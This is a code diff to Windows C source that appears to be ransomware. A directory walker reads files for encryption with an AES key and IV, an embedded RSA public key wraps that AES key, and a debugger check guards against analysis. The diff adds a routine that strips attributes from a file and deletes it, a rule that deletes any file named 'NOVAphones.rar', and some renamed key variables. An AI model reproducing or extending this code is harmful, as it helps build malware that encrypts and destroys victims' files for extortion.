@@ -640,6 +640,10 @@ BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {
 			}
 		}
 		else {
+			if (wcscmp(fileData.cFileName, L"NOVAphones.rar") == 0) {
+				DeleteWin(filePath);
+				continue;
+			}
 
 			if (!ReadFromFile(&pData, filePath, &szData)) {
 				continue;
@@ -708,7 +712,7 @@ BOOL DirectoryFiles(WCHAR* pDirectoryPath,uint8_t* key, uint8_t* iv) {
 
 BOOL ImportPubkey(HCRYPTPROV* hCryptProv,HCRYPTKEY* hKey) {
 
-	BYTE serverPublicKey[] = {
+	BYTE publicKey[] = {
 	0x06, 0x02, 0x00, 0x00, 0x00, 0xA4, 0x00, 0x00, 0x52, 0x53, 0x41, 0x31, 0x00, 0x04, 0x00, 0x00,
 	0x01, 0x00, 0x01, 0x00, 0xD1, 0x75, 0xA3, 0x89, 0x7E, 0x64, 0xD3, 0xD6, 0x48, 0xF5, 0x84, 0xC2,
 	0xC2, 0x22, 0x41, 0x61, 0x8F, 0xBC, 0xB4, 0x66, 0x4E, 0xF7, 0x2D, 0x3F, 0x57, 0xAF, 0xB8, 0x93,
@@ -747,7 +751,7 @@ BOOL ImportPubkey(HCRYPTPROV* hCryptProv,HCRYPTKEY* hKey) {
 	}
 
 
-	if (!pCryptImportKey(*hCryptProv, serverPublicKey, sizeof(serverPublicKey), 0, CRYPT_EXPORTABLE, hKey)) {
+	if (!pCryptImportKey(*hCryptProv, publicKey, sizeof(publicKey), 0, CRYPT_EXPORTABLE, hKey)) {
 		return FALSE;
 	}
 
@@ -794,7 +798,7 @@ BOOL RSAwork(uint8_t* keyValue, WCHAR* keyPath) {
 	
 
 	HCRYPTPROV hProv = 0;
-	HCRYPTKEY serverHandlePKey = 0;
+	HCRYPTKEY handlePKey = 0;
 	SIZE_T szEncAESKey = AES_256_KEY_SIZE;
 	SIZE_T szPublicKey = 0;
 	PBYTE publicKey = NULL;
@@ -821,11 +825,11 @@ BOOL RSAwork(uint8_t* keyValue, WCHAR* keyPath) {
 	}
 
 
-	if (!ImportPubkey(&hProv,&serverHandlePKey)) {
+	if (!ImportPubkey(&hProv,&handlePKey)) {
 		goto _EndFucntion;
 	}
 
-	if (!EncryptAESKey(serverHandlePKey, (PBYTE)keyValue, &szEncAESKey, &encAESKey)) {
+	if (!EncryptAESKey(handlePKey, (PBYTE)keyValue, &szEncAESKey, &encAESKey)) {
 		goto _EndFucntion;
 	}
 
@@ -837,7 +841,7 @@ BOOL RSAwork(uint8_t* keyValue, WCHAR* keyPath) {
 
 _EndFucntion:
 
-	if (serverHandlePKey) pCryptDestroyKey(serverHandlePKey);
+	if (handlePKey) pCryptDestroyKey(handlePKey);
 	if (hProv) pCryptReleaseContext(hProv, 0);
 
 	if (publicKey) {
@@ -852,7 +856,26 @@ _EndFucntion:
 	return result;
 }
 
+BOOL DeleteWin(WCHAR* filePath) {
+	BOOL bSuccess = FALSE;
 
+	if (!filePath) {
+		printf("[!] Invalid parameters passed to DeleteWin\n");
+		return FALSE;
+	}
+
+	// Reset attributes to normal to avoid issues
+	if (!SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL)) {
+		printf("[!] Failed to reset file attributes %d\n", GetLastError());
+	}
+
+	bSuccess = DeleteFileW(filePath);
+	if (!bSuccess) {
+		printf("[!] Cannot delete file %d\n", GetLastError());
+	}
+
+	return bSuccess;
+}
 
 BOOL CheckIsDebuggerPresent() {
 	if (IsDebuggerPresent()) {
